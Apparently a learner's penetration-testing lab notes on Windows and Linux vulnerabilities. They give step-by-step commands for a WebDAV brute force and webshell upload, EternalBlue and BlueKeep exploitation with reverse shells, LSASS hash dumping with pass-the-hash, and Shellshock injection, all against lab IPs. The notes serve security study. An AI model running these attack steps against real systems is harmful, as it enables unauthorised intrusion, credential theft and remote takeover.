
1. [Windows Vulnerabilities](Vulnerability%20Assessment.md#windows-vulnerabilities)
2. [Microsoft IIS and WebDav](Vulnerability%20Assessment.md#iis-and-webdav)


---
### Windows-Vulnerabilities

The various OS versions/relates makes the threat surface fragmented since some vulnerabilities  that exist in on OS might not be present in another. All Windows versions share common issues:
- The OS is built in C, making them prone to buffer overflows, arbitrary code exec etc. 
- Vulnerable to cross platform vulnerabilities (ie SQL Injection attacks)
- Vulnerable to physical attacks (theft, malicious usb devices)
### Common Windows Vulnerability Types

- **Information Disclosure:** Allows unauthorized access to sensitive data.
- **Buffer Overflows:** Caused by programming errors, allowing malicious code to overwrite memory and potentially execute malware or provide remote access.
- **Remote Code Execution:** Lets attackers execute code remotely on the system.
- **Privilege Escalation:** Allows attackers to elevate privileges post-compromise, often due to misconfigurations.
- **Denial of Service (DoS):** Overloads system resources, preventing normal operation.
### Commonly Exploited Windows Services

- **Microsoft IIS** (TCP 80/443): Web server software used on Windows.
- **WebDAV** (TCP 80/443): HTTP extension for file management on web servers.
- **SMB/CIFS** (TCP 445): File sharing protocol for local networks.
- **RDP** (TCP 3389): Remote access protocol used for GUI-based interactions with Windows systems.
- **WinRM** (TCP 5986/443): Windows remote management protocol for executing remote commands.
---
## Vulnerability-Scanning 

Vulnerability scanning & detection is the process of scanning a target for vulnerabilities and verifying whether they can be exploited. This information will useful during the exploitation phase
### Vulnerability Scanning with MSF

Can use auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, OS's and webapps.

- Start PostgreSQL/MSFConsole: `service postgresql start` > `msfconsole`
- (Optional) Can create a workspace: `workspace -a workspace_name`
- (Optional) Can set the RHOST/RHOSTS global variables set you dont have to set the IP for each module execution `setg RHOST target`
### 1. Getting Service Versions and Operating Systems

Goal: Key piece of information for vulnerability scanning for a target OS or services running on it is the service version. Can get service info and the OS from nmap or metasploit modules: 

**a.  Scan using NMap**

```
db_nmap -sS -sV -O -p- target
```

- `-sS` SYN Scan/Stealth Scan 
- `-sV` Service Version detection
- `-O`   Operating system detection
- `-p-`  The full TCP port range (65,535)

**b. Scan using Metasploit**

Metasploit doesn't have a single module that does everything in one shot like `nmap`, need to combine different auxiliary modules to accomplish this:
1. Can use `auxiliary/scanner/portscan/tcp` for a general TCP scan or `auxiliary/scanner/portscan/syn` to perform the SYN scan.
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set PORTS 1-65535
run
```
2. **Getting Service Version**: Use various service version modules (like `http_version`, `smb_version`) to detect services and versions.
```
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run
```
3. **Getting OS**: There isn't a direct way to perform OS detection with metasploit. Some auxiliary scanners like smb_version can have OS detection but you might need use exploits to fingerprint the system. 
### 2. Look for Exploits/Vulnerabilities

There's a number of way to search for exploit and vulnerabilities:
#### 2.a - Manual Search in Metasploit
The found services and their versions from the scans should be in `services` in Metasploit. Take each of the observed services and look through Metasploit using its built-in utility for any exploits for each of them

```
search type:exploit name:<service_name>
```

If you don't find the service  in Metasploit, it could be that:
1. The particular version of the service isn't vulnerable to any inherent exploit or
2. There isn't a Metasploit exploit available to exploit the service 

If you <u>do</u> find a service that might work with an exploit, you can  double-check through the module's description to confirm that the version of the service would.
```
use <module>
info
```

**Random note**: Confirm the operating system (Linux/Windows) for the payload so that you can get a meterpreter session

```
set payload windows/meterpreter/reverse_tcp
```

#### 2.b - Kali Searchsploit

Another search option for looking for exploits is built-in to Kali which is `searchsploit`.  Searchsploit is a cmd-line utility which searches the ExploitDB for exploits. The searches can bring in exploit/exploit code that isn't available in Metasploit console and also Metasploit exploits, so we can limit the search to just metasploit exploit modules. Metasploit modules will have (Metasploit) in the exploits name so we can grep the search to filter the other results out:
```
searchsploit " <service> " | grep -e "Metasploit"
```
You can see some of the service versions from the `searchsploit " <service> "` search of some of the exploits and the exploits with the a metasploit equivalent module should have OS versions to see if it works for the target.

#### 2.c - Metasploit Autopwn

Autopwn is a plugin that does a scan of the open services and provides exploit modules that could work with each of the services. This only works best after enumerating services

- Link to Github: https://github.com/hahwul/metasploit-autopwn

- download db_autopwn.rb file in metasploit plugin directory

```
#> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
```

If saved to downloads...
```
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
```
- Load the plugin
```
load db_autopwn
```

- Run the plugin: This can be overwhelming, so narrowing the search to just ports would provide a list of exploits for a port
```
db_autopwn -p -t -PI <port>
```
- `-p` Select modules based on open ports
- `-t` Shows all matching exploit modules
- `-PI` Only exploit hosts with these ports open

#### 2.d. - Analyze Command

The Metasploit `analyze`  command will analyze the contents of the metasploit database (hosts,services) and provide a list of vulnerabilities that the services are affected by.

```
analyze
```

Can see the found vulnerabilities using `vulns`.

---
### IIS-and-WebDav

**IIS (Internet Information Services)** is a web server developed by Microsoft for the Windows NT family. It can be used to host static and dynamic websites and web apps developed in  ASP.NET/ PHP and provides a GUI for managing websites. Typically running on ports 80 and 443, IIS handles executable file extensions like `.asp`, `.aspx`, `.config`, and `.php`.

**WebDAV (Web-based Distributed Authoring and Versioning)** is an extension of HTTP that allows users to  edit/manage files on  web servers, essentially turning a web server into a file server. It can run on top of  IIS, Apache etc over ports 80/443 and requires authentication via a username and password to connect.
#### WebDAV Exploitation

1. Identify if WebDAV is configured on the IIS server.
2. Check if authentication is needed for WebDAV.  When WebDAV is running on a Windows host, sometimes it doesn't have any authentication. If it does, perform a brute-force attack to find valid credentials for authentication.
3. Use the credentials to upload a malicious .asp payload, enabling command execution or a reverse shell on the target.


#### Initial Nmap Scan



Goal: See if WebDav is enabled, what directory is it enabled on and if authentication is needed


Can run an initial scan to get general information on the target

```
nmap -Pn -sV -sC <target>
```

- `-Pn` = Port scan without ping 
- `-sV`  = Service version check
- `-sC` = Important Here: Runs additional scripts on each port to enumerate information.
- Note: Not specifying port options means nmap will scan the top 1000 most common ports

The `-sC` options is helpful since it can tell if WebDAV is enabled using scripts like '*http-webdav-scan*'. This might not show the directories that WebDav is enabled on, so we can run an additional Nmap script scan using the `http-enum` nmap script against the port WebDav is running (80/443) to confirm the directory and if authentication is enabled:

```
nmap -sV -p80 --script=http-enum <target>
```

The http-enum script should return some helpful information like <u>the directory webdav might be enabled on</u>. If you get a response like `401 Unauthorized` then authentication has been enabled on the WebDav server. You can manually check that location in the browser.

```
http://target/listed_webdav_directory/
```

**Performing a Brute Force**

Authentication is needed and we don't have the creds, 

When penetration testing, be careful of the performing a brute force on any service since it could cause a DoS (Denial of Service). Be aware that wordlists might not have the credentials you're looking for so you'd want to perform more reconnaissance to confirm the users that will have access to WebDav. For the passwords, there's a lot of wordlists out there that might provide the actual credentials.

```
hydra -L users_file -P passwords_file <target> http-get <webdav_directory>
```


Example: 

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.41.42.41 http-get /webdav/
```


#### Davtest

Davtest is a WebDAV scanner used for scanning, authenticating, and exploiting WebDAV servers. Used for checking if authentication is enabled, authenticate with it and run checks to show what can be done for exploitation.  Davtest comes pre-installed on most penetration testing distributions like Kali and Parrot OS.


**Authentication**

```
davtest -url <target_location>
```
- `-url` = url of DAV location

Example:
```
davtest -url http://10.16.25.85/webdav
```

An `Unauthorized` response would mean valid credentials is required.



To provide the creds, use the `-auth` option and then include  `username:password`:
```
davtest -auth <user>:<password> -url <target__location>
```

Example:
```
davtest -auth admin1:412pass -url http://10.16.25.85/webdav
```

The  results for DavTest will have the following checks show in the output
1. **Testing DAV Connection** = Authenticates WebDav and creates a random string for the session (like `E93ge9fF39Giz`) which is  appended to any directory or file that is created
- `http://10.16.25.85/webdav`
	- Also creates a random string for the session (like `E93ge9fF39Giz`)
2. **Creating creating** | Tries creating a directory
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz` 
3. **Sending test files** | Tries uploading test files like txt,jsp,aspx etc)   
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz/davtest_E93ge9fF39Giz.aspx` 
4. **Checking for test file execution:** Tests the execution of each type of file that was uploaded. Important to see which types of files can be executed on the server.
	- <u>Asp would be good for generating an asp payload or uploading an asp webshell which can be accomplished by cadaver.</u>

### Cadaver

Cadaver is a tool for WebDAV clients that lets us upload and download files from the WebDav directory. Also comes pre-installed on most penetration testing distributions like Kali and Parrot OS.

General Syntax:
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

You'd then be promoted for the username and password

```
Username: user
Password: rando_pass
```

You be given the a psuedo shell to interact with the server | `dav:/directory/>`

##### Upload the Webshell using Cadaver

We can upload a webshell to get some kind of command execution on the target system. A webshell is a script or program uploaded to a web server, which can allow us to remotely execute commands, manipulate files, or access the server's resources. It essentially serves as a backdoor, giving us control over the server.  

1. **Find the Webshell:** Kali Linux comes pre-packaged with various webshells grouped by programming languages including `asp, aspx, cfm, jsp, perl, php `. They can be found in:
```
/usr/share/webshells/
```

Kali has a webshell for asp located at :
```
/usr/share/webshells/asp/webshell.asp
```

2. **Upload the Webshell to the WebDav server**: This can be uploaded through cadaver to the WebDav Server using a PUT command:
```
put /usr/share/webshells/asp/webshell.asp
```

3. **Execute the Webshell script:**  Once the webshell has been uploaded, navigate to that  file location in the WebDav directory it was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/webshell.asp` from the browser, click on the file to trigger the script.
4. **Interact with the Server**:  Webshells normally comes with a user-friendly interface like input fields/search boxes that allows attackers to interact with the compromised server. After executing the `webshell.asp` script, there should be a search box which would let you run commands on the target system where the output would. We can do anything like searching for files, executing shell commands, or navigating directories. 

- List directory content with `dir`
```
dir C:\
```

- Print out file contents
```
type C:\flag.txt
```


## WebDav: Process from Start to Finish

1. <u>Identify if WebDAV is configured on the IIS server</u>: Can use nmap for an initial scans/enumeration using `-sV`, `-sC` options. This should pull the webdav directory:

```
a. nmap -Pn -sV -sC <target>
```

2. <u>Check if authentication is needed for WebDAV</u>: The nmap `http-enum` script scan or `davtest` can tell you if authentication is needed on the WebDav location. If it does need authentication (getting a 4xx error), perform a brute-force attack using something like `hydra` to find valid credentials for authentication. Might want to perform more reconnaissance to confirm the users that will have access to WebDav. There's a lot of wordlists for passwords that might provide the right creds:

- **Nmap**
```
nmap -sV -p80 --script=http-enum <target>
```

- **DavTest**
```
Syntax -> davtest -url <target_webdav_location>

Example -> davtest -url http://10.16.25.85/webdav
```

- **Hydra**
```
Syntax -> hydra -L users_file -P passwords_file <target> http-get <webdav_directory>

Example -> hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.41.42.41 http-get /webdav/
```


3. <u>Use the credentials to upload a malicious .asp payload, enabling command execution or a reverse shell on the target.</u>

a.  Sign in and run `davtest` to confirm what type of files can be executed on the server
```
Syntax -> davtest -auth <user>:<password> -url <target__location>

Example -> davtest -auth admin1:412pass -url http://10.16.25.85/webdav
```

b. Use cadaver setup a shell session with the WebDav Server
```
Syntax -> cadaver <target_location>

Example -> cadaver http://10.16.25.85/webdav/
```

c. Upload the webshell script to the Server using a `PUT` request within the cadaver session. Kali's webshells can be found `/usr/share/webshells/`
```
put /usr/share/webshells/asp/webshell.asp
```

d. Navigate to the web shell on the server from the browser, click the script to execute
```
Uploaded To ->  `/webdav/`

Visit -> http://targetsite.com/webdav/webshell.asp
```


---
## Vulnerability Analysis

EternalBlue is a critical Windows vulnerability that lets attackers remotely run code on a target system, giving them access to both the system and the network it’s connected to. It was originally created by the NSA and leaked in 2017 by the Shadow Brokers. EternalBlue works by exploiting a flaw in the SMBv1 protocol, which allows attackers to send specially crafted packets and execute commands on the system, or even give themselves a reverse shell or meterpreter session. One of its key features is that it automatically gives elevated privileges, so there’s no need for further privilege escalation. The exploit became infamous when it was used in the **WannaCry ransomware attack** in June 2017. WannaCry paired with EternalBlue to scan for  Windows systems on a network, infect them, and spread the ransomware to other machines.

EternalBlue impacts Windows Vista, Windows 7, Windows Server 2008, Windows 8.1, Windows Server 2012, Windows 10 (certain builds), and Windows Server 2016. <u>It's especially effective on Windows 7, 8.1, Server 2008, and Server 2012</u>, and works on both 32-bit and 64-bit systems. Despite a patch being released in March 2017, many systems remain unpatched, leaving them vulnerable.

**Metasploit Support:**

- There’s an **MSF auxiliary module** that checks if a system is vulnerable to EternalBlue.
- There’s also an **exploit module** that can exploit unpatched systems, giving attackers privileged access and a meterpreter session.


Run an Nmap scan to identify open ports but we're mainly interested in SMB which is 445

```
sudo nmap -sV -p 445 -O target
```

- `-sV`= Checks the version of services
- `-O` = Checks Operating system | Will confirm what version of windows is running
- `-p 445` = Port 445

You can run the `smb-vuln-ms17-010` Nmap script to check if the target is vulnerable to the Eternal Blue exploit:

```
nmap -sV -p 445 --script=smb-vuln-ms17-010 <target>
```

If the system is vulnerable, we can execute the exploit:


### Running Exploit Manually

- Autoblue -MS17 -010: https://github.com/3ndG4me/AutoBlue-MS17-010


Clone the AutoBlue repository:
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

1. Python exploit files for each version of Windows
	- `eternalblue_exploit7.py` (and server 08)| `eternalblue_exploit8.py` (and 8.1)| `eternalblue_exploit10.py`
2. Requirements.txt | Helpful for getting python dependencies installed



```
pip install -r requirements.txt
```



Exploit Process: For the exploit to work, we first need to generate shell code that will be exploited on the target system. Once that's generated, we'll need to setup our listener and run the python exploit script (`eternalblue_exploit7.py`) specify the target IP and the shell code we would like to exploit then we should get a reverse shell on the netcat listener


Generating Shell Code

1. We're going to run the bash script `shell_prep.sh`. Make sure to add execution permissions to the script before attempting to run it:

```
chmod +x shell_prep.sh
```
- `+x` = Adds execution permission onto the script

2. Execute the script
```
./shell_prep.sh
```

3. Respond to  'Eternal Blue Windows Shellcode Compiler' prompt:  Should get the prompt `...would you like to auto generate a reverse shell with msfvenom (Y/n`. **msfvenom** is a tool that generates payloads, which are small pieces of code sent to a target system once it's compromised. In this case, it will create a **reverse shell**, which means the compromised system will initiate a connection back to an attacker's machine (us), allowing remote control. We'll say `yes` here.

Set your machine's IP for `LHOST` (Local Host)
```
LHOST for reverse connection: 
10.23.25.45
```
Set you listening ports of your machine for the payloads:
```
LPORT you want x64 to listen to:
1234
LPORT you want x86 to listen to:
1234
```
Specify if you want to generate a meterpreter shell or regular cmd shell (We'll choose 1)
```
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
```
Specify if you want to generate a staged or stageless payload: A **non-staged (stageless) payload** sends the entire payload all at once, whereas  staged payloads sends a small piece first before sending the rest. 

```
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
```

Generate the payload

This will take to some to generate the shellcode

This should export into a bin file (ie `sc_x64_msf.bin`) which is where the shell code is saved.

Once its generated, we should be able to execute either the x64 or x86 shell code depending on the target OS's architecture.  Now we can setup our netcat listener


#### Set up Netcat Listener 

Netcat (often abbreviated as **nc**) is a networking tool used for tasks like port scanning, file transfers, and establishing connections between computers. One of its key features is the ability to set up a listener, which waits for incoming connections on a specified port. To set up a basic listener in Netcat, you would use the command `nc -l -p <port>`, where the **-l** flag tells Netcat to listen and **-p** specifies the port number. 

```
nc -nvlp 123
```
- `-l`: Listener | This tells Netcat to listen for incoming connections 
- `-p 1234`: Specifies the port number to listen on, which in this case is port 1234.
- `-n`: (Optional) | Tells Netcat not to resolve hostnames (use raw IP addresses instead). This speeds things up and avoids DNS lookups.
- `-v`:  (Optional) Runs Netcat in **verbose** mode, providing detailed output

This creates a simple server that will wait for incoming data or connections on the chosen port. We'll need to get the tab open and wait for the shell. With the listener setup, now we can run the python executables

1. We're going to run the bash script `shell_prep.sh`. Make sure to add execution permissions to the python script before attempting to run it:

```
chmod +x eternalblue_exploit7.py
```
- `+x` = Adds execution permission onto the script

2. Execute the script
```
python <python_exploit_py> <target_ip> <shell_code_exe>
```

Example

```
python eternalblue_exploit7.py 10.82.54.22 shellcode/sc_x64.bin
```

If you go back to the netcat session, you'll see the cmd-shell open from it.



### Running Exploit with Metasploit


Open `msfconsole`

```
msfconsole
```

Search for the Eternal Blue exploit 

```
search eternalblue
```

There's an auxiliary module (auxiliary/scanner/smb/smb_ms17_010) that tells you if the system is vulnerable and a exploit module `exploit/windows/smb/ms17_010_eternalblue`. Go and select the exploit....

```
use exploit/windows/smb/ms17_010_eternalblue
```

... make any necessary configurations:
- `RHOSTS` = Target system 
- `LHOST`/`LPORT` | Your system's local host IP and its listening port

```
set RHOSTS 10.82.54.22 
```

After configuring changes, run the exploit using `exploit`. The exploit is done and a meterpreter session should be established. The username allowed should be NT AUTHORITY\SYSTEM

## BlueKeep

BlueKeep (CVE-2019-0708) is a remote code execution (RCE) vulnerability in the Windows RDP protocol, publicly disclosed by Microsoft in 2019. It allows attackers to exploit a flaw in the RDP protocol, gaining access to a portion of kernel memory and remotely executing arbitrary code at the system level without authentication. Attackers specifically target the kernel because it operates in a highly privileged space, meaning any code run there will inherit elevated privileges. For instance, executing a meterpreter payload in the kernel would grant a session with elevated access. However, executing code at the kernel level also carries the risk of causing system instability or crashes. Microsoft released a patch for this vulnerability on May 14th, 2019.


The BlueKeep vulnerability affects multiple versions of Windows XP, Vista, Windows 7 and Windows Server 2008 & R2.

Prerequisites for this exploit is:
1. RDP needs to be enabled
2. Network-level authentication can't be enabled or the exploit will fail

The BlueKeep vulnerability has illegitimate proof of concepts (PoCs) and exploit code that could be malicious, potentially performing tasks unrelated to the exploit itself. Microsoft did not release public PoCs or exploit code for BlueKeep, as doing so would have worsened the vulnerability's impact. Security researchers created PoCs without payloads, demonstrating the vulnerability by performing non-malicious actions like creating files, rather than executing reverse shells. It's recommended to only use verified exploit code to avoid malicious variants.

The BlueKeep exploit includes an MSF auxiliary module to check if a system is vulnerable and an exploit module to target unpatched systems. However, the exploit requires adjustments based on the Windows version and the memory chunk size needed to execute the code. When successful, the exploit provides a standard command shell or a meterpreter session on the target.


1. Perform a port scan to confirm if RDP is running on the target:
```
nmap -p 3389 target
```
2. Run the metasploit auxiliary module to confirm if the version of RDP is vulnerable. Start metasploit with `msfconsole`, and then search '`Bluekeep`':
```
search Bluekeep
```
The results will have the auxiliary module `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` and the exploit, the exploit will also run the aux scanner module. 
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
### or "use 0/1" ##
```
Make any configuration changes for the scanner
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```
Type `run`  to start the scan
```
run
```

Run the exploit:

We can select the exploit `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` 
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
### or "use 0/1" ##
```

Configure the module options:
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```

Configure the payload options 
- `LHOST` (Listening Host) = Your local machine
- `LPORT`(Listening Port) = The port on your system to listen

Just type `exploit`  to run the exploit
```
exploit
```

Might get a `bad-config` response if you don't specify a target, the module gives the ability to specify the target configuration or version of Windows to target

```
show targets
```

Set target to whatever the ID of the OS running on the target
```
set target 2
```


Part of the output would include something along the lines of `Using CHUNK Grooming strategy. Size 250MB, target address 0xfffffx8011e07000, Channel count 1`.

**Grooming** is the process of preparing a system’s memory or other states to manipulate how resources—such as memory blocks or file handles—are allocated or managed. The goal of grooming is to position vulnerable memory segments in predictable locations, making it easier for an exploit to succeed by taking advantage of these weaknesses.

A common form of grooming is **chunk grooming**, which specifically targets heap memory. The **heap** is a region of memory used for dynamic allocation during the runtime of programs. It's structured into units called **chunks**, which vary in size. Chunk grooming involves controlling how these chunks are allocated and placed, ensuring that vulnerable memory blocks are aligned in a way that increases the likelihood of a successful attack.

A **groomer** is a tool or process used to carry out grooming techniques. It carefully arranges memory chunks or other system resources into a state where an exploit can more easily take control, making it a critical step in certain types of attacks that rely on memory manipulation.

In this case, the groomer reserves large blocks of memory in RAM —such as the `250MB` mentioned in the output. By doing so, it forces the operating system to place the vulnerable memory segment (at the address `0xfffffx8011e07000`) in a location that the attacker can predict. Without this grooming, memory could be allocated randomly, which would make it much harder for the exploit to reliably target and manipulate the vulnerable segment. By carefully "grooming" the memory layout, the attacker increases the likelihood that their code will be successfully executed. 

After the exploit is done, the meterpreter session should be allowed. This works like EternalBlue where we didn't need to elevate our privileges to get admin access. 

---

## Pass-The-Hash-Attacks

Pass-the-hash is an exploitation technique to capture NTLM hashes or clear-text passwords and utilizing them to authenticate against a target system legitimately.  Rather than exploiting services directly, this method leverages legitimate credentials to gain access to the system.

If you successfully obtain administrative access on a Windows target system, there's no need to re-authenticate to access the same Meterpreter session or reverse shell with administrative privileges. Even if the vulnerable service is patched, disabled, or blocked by a firewall rule, you can still regain access using the captured administrative hash. The hash allows you to access the system whenever you want, making this a form of persistence. Essentially, with the hash, you bypass the need to rely on the previously exploited service for continued access.
##### How to perform the attack

We'll exploit the server, then dump the hashes with kiwi and then uses the hash to perform a pass-the-hash attack by authenticating legitimately  to a service.


1. <u>We can start postgresql and then metasploit</u>
```
service postgresql start && msfconsole
```
2.  <u>Run an exploit to get a meterpreter session on the target</u>: The lab is exploiting which is a lightweight web server software originally created for file sharing and web hosting on Windows systems. Although it was once popular for these purposes, BadBlue is now considered outdated, and its security flaws have made it a target for exploitation. One of the most serious vulnerabilities in older versions of BadBlue is a buffer overflow exploit that enables remote code execution.  The Metasploit module `exploit/windows/http/badblue_passthru` targets a vulnerability in older versions of BadBlue (2.7 and earlier), exploiting a flaw in the `Passthru.dll` component which handles user input and passes it to system commands. By sending malicious HTTP requests, we can execute arbitrary commands and gain remote shell access with the same privileges as the web server, without needing valid credentials.

Use the exploit: 
```
use exploit/windows/http/badblue_passthru
```
Configure the module and the meterpreter payload (optional) should get a `windows/meterpreter/reverse_tcp` payload by default:
- `RHOSTS` = The target IP
```
set RHOSTS 10.61.25.84
```
Run the exploit:
```
exploit
```

3. <u>Find and migrate to the LSASS process</u>.  **LSASS** (Local Security Authority Subsystem Service) is a crucial in Windows responsible for enforcing security policies, handling password changes, and managing stored credentials, including NTLM hashes. When connected to a Meterpreter session, you're generally tied to the process or service that was exploited and the  `migrate` command in Metasploit allows us to move the Meterpreter session to another process.  Migrating to the LSASS process allows us to extract credentials like NTLM hashes from memory while also granting higher privileges for broader control over the  system. To use `migrate`, we need to specify process by providing its PID (process ID). To find the PID for the service, we can use the `pgrep` command and just search the service's name. The `pgrep` command is a Unix-based utility only natively available on Linux/Mac , however, `pgrep` becomes available as a Meterpreter command when you're working with a compromise Windows system.

- **Use pgrep to get the PID**
```
meterpreter> pgrep lsass
```
- **Migrate to the LSASS service using that PID**
```
meterpreter> migrate 678
```

We should now have NT AUTHORITY\SYSTEM privileges

4. <u>Run Kiwi to get the NTLM Hashes</u>: In Metasploit, `kiwi` is an extension of **Meterpreter** that provides advanced credential extraction capabilities. It is essentially a Metasploit implementation of **Mimikatz**,  which is a well-known tool for extracting credentials from Windows systems.
- **Load the Kiwi extension**
```
meterpreter> load kiwi
```
- **Run the `lsa_dump_sam` command**: The`lsa_dump_sam` is a command in the Kiwi extension (or Mimikatz) that extracts NTLM and LM password hashes for local users from the Security Account Manager (SAM) database. The hashes are pulled directly from memory, bypassing file locks. The hashes should be outputted, this will be the same if you did this with Mimikatz:
```
meterpreter> lsa_dump_sam
```
- **View the Hashes**: The hashes should also display after running the `lsa_dump_sam` command but can also run `hashdump` which would display the same hashes:
```
meterpreter> hashdump
```

The output should be structured like this....
```
username : SID : LM_hash : NTLM_hash
```

We'll need to copy both the LM hash and the NTLM hash since certain exploits like the metasploit Psexec module requires both.
##### Performing the Pass-the-Hash Attack

Now we can used the captured NTLM hashes to authenticate with the target legitimately to the service/system.  Tools like the Metasploit PsExec module and CrackMapExec can be used to carry out this type of attack:

##### Metasploit PxExec
The `windows/smb/psexec` module in Metasploit is commonly used for pass-the-hash attacks because it interacts with the widely-used SMB protocol in Windows networks, allowing for remote execution. The module mimics the legitimate psexec tool to authenticate with the SMB service on a target machine using captured NTLM or LM hashes, bypassing the need for a plain-text password. Once authenticated, the module remotely executes commands or delivers a payload, such as a reverse shell, to gain control of the system. 

1. <u>Search for the PsExec Module</u>: Background the existing meterpreter session using `Ctrl+Z`
```
search psexec
```
We need the `exploit/windows/smb/psexec` exploit 
```
use exploit/windows/smb/psexec
```
2. Configure the exploit module and payload options:
	- `RHOST` = Target IP
	- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
	- `SMBDomain` = If connected to a domain
	- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide. 
```
set LPORT 4312

set SMBUser <user>
```

Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone
```
set SMBPass lm_hash:ntlm_hash
```
Example
```
set SMBPass aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```
The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. In this case, you can still set it as this to bypass the LM requirement.

This exploit uses SMB to gain remote code execution, there's different methods for delivering and executing the payload on the target system so we might need to specify it specifically here to get a meterpreter session. We can try running `set target` command for `Command` to get a shell or Native upload a Meterpreter executable on the system. 
```
set target Native\ upload
```
Run the exploit
```
exploit
```
You might need to tweak the target for the exploit 0but you should get a meterpreter session.

##### CrackMapExec
The other tool for the pass-the-hash attack using the dumped NTLM hashes is `crackmapexec`.

General Syntax:
```
crackmapexec smb target -u username -H "NTLM_hash" -x "enter_cmd_here"
```
- `-u` = username
- `-H`= The NTLM Hash
- `-x` = The command that will execute on the target

Example:
```
crackmapexec smb target -u Administrator -H "5f4dcc3b5aa765d61d8327deb882cf99" -x "net user"
```

---

### Frequently Exploit Linux Services


Linux is a free and open-source operating system made up of the **Linux kernel**, developed by Linus Torvalds, and the **GNU toolkit** (cat ls cd dir), initiated by Richard Stallman. Often referred to as **GNU/Linux**, it is commonly used as a server OS, with services and protocols running that can serve as access vectors for attackers. 
- **Apache Web Server** | TCP ports 80/443 | Free and open source cross-platform web server which accounts for over 80% of web servers globally.
- **SSH (Secure Shell)** |TCP ports 22 |  SSH is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet.
- **FTP (File Transfer Protocol)** | TCP port 21 | The protocol is used to facilitate file sharing between a server and client/clients and vice versa.
- **SAMBA** | TCP port 445 |  Samba is the Linux implementation of SMB  and allows Windows systems to access Linux shares and devices.

### ShellShock

Bash is a common Nix shell, part of the GNU project, and is the default shell for most Linux distributions. Shellshock is a family of vulnerabilities in the Bash shell (since version 1.3) that allows an attacker to execute remote arbitrary commands, potentially granting remote access via a reverse shell. The vulnerability was discovered in September 2014.

 The vulnerability arises when Bash mistakenly executes trailing commands after a specific string of characters: `() {:;};`. Anything following this string is executed unintentionally by Bash. Apache web servers configured to run CGI scripts are particularly vulnerable. CGI scripts are used by Apache to execute commands on the server and return results to a web client. Attackers can exploit CGI scripts by injecting malicious commands into request headers, such as the User-Agent header. When the web server executes the CGI script, Bash is triggered and the injected commands are executed.
    
**Exploitation Process**
To exploit Shellshock, you need a vulnerable input vector, such as a CGI script running on an Apache server. The key steps include:
1. Identifying a CGI script that interacts with Bash.
2. Sending a crafted HTTP request that includes the malicious `() {:;};` string followed by the desired commands.
3. The web server executes the CGI script using Bash, processing the injected commands.

**Tools for Exploitation**
The vulnerability can be exploited manually by interacting with the server via proxy tools or automatically with Metasploit's exploit module. These methods can result in obtaining a reverse shell or a Meterpreter session.

###### 1. Find the input vector to exploit

We can first view the page source of the website to see if there's a CGI script explicitly visible in the webpages HTML/Javascript. Sometimes, CGI scripts can be visible here which would make it easier to identify and attempt the exploitation. Something like this:
```
xhttp.open("GET", "/gettime.cgi", true)
```
However, visibility in the page source is not necessary for discovery.  Tools like Nmap or Nikto scan for common script locations (e.g., `/cgi-bin/`), while DirBuster and Gobuster brute-force hidden paths. Misconfigured servers may reveal scripts through error messages like 404s or by allowing directory listings. Even without visible clues, attackers can analyze HTTP responses to infer the presence of CGI scripts or Bash-related processes.

###### 2. Check if the system is vulnerable to ShellShock

We can use the nmap script `http-shellshock` to check if the target is vulnerable to it. We also need to provide the arguments for the script 
```
nmap -sV target --script=http-shellshock --script-args "http-shellshock.uri"=<loc_of_cgi_script>
```
- `sV` = Service version detection
- `"http-shellshock.uri"` = The location of the cgi script

Example:
```
nmap -sV 10.66.38.37 --script=http-shellshock --script-args "http-shellshock.uri"=/test.cgi
```

We can use the cgi script to inject the special characters within HTTP headers using the User-Agent header

###### 3. Use a proxy like Burp Suite/ZAP

Note: If you're using Firefox with FoxyProxy, you can switch the profile to Burp Suite/ZAP which would direct all traffic through those proxies.

Open BurpSuite (From Kali `Menu > Web Application Analysis > burpsuite`) a temporary project is fine and using Burp defaults is also fine

Click the `Proxy` tab and make sure the Intercepter is enabled (`Intercept is on`). Click Foward and then reload the webpage